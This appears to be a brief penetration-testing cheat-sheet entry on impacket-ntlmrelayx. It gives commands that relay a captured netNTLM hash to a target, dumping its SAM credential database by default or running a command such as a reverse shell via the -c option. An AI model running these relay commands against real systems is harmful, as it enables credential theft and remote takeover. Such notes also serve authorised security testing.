Used to capture a connection's `netNTLM` hash and then pass it to another machine.

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t $target
```

By default, it dumps SAM database, but we can execute a command with `-c` instead

```sh
impacket-ntlmrelayx --no-http-server -smb2support -t $target -c 'some revshells'
```
